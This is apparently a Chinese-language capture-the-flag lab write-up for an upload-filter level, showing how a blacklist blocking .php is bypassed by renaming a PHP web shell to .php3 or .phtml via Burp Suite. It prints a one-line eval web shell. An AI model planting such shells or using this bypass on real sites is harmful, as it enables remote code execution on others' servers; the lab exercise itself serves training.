## 解题wp(By:独立团孙德胜Alan)
本pass可以修改PHP后缀绕过！

## 1.打开第三关

![](./img/1.png)

## 2.上传一个普通的shell.php文件

```
<?php @eval($_POST('Alan'));?>
```

![](./img/2.png)

#### 提示不允许上传.asp,.aspx,.php,.jsp后缀文件！

### 3.分析代码

![](./img/3.png)

#### 发现原来过滤.php，但.php3 、Phtml等都可以被解析，成功绕过

### 4.我们可以使用Burpsutie抓包，修改后缀，绕过验证。

![](./img/4.png)

![](./img/5.png)